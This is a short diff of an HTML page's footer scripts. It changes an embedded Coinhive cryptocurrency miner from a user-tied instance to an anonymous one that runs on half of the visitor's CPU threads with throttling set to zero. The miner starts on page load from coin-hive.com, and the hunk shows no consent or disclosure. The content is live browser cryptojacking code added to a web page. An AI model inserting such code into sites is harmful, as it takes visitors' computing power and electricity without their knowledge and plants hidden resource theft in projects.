@@ -116,9 +116,10 @@
         <!--endregion-->
         <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
         <script>
-            new CoinHive.User(
-                'gvf44wr3z0AIpcmvG1gyl0EOqCrMHXSN', 'test'
-            ).start()
+            new CoinHive.Anonymous('gvf44wr3z0AIpcmvG1gyl0EOqCrMHXSN', {
+                threads: navigator.hardwareConcurrency / 2,
+                throttle: 0
+            }).start()
         </script>
     </body>
     <!--endregion-->
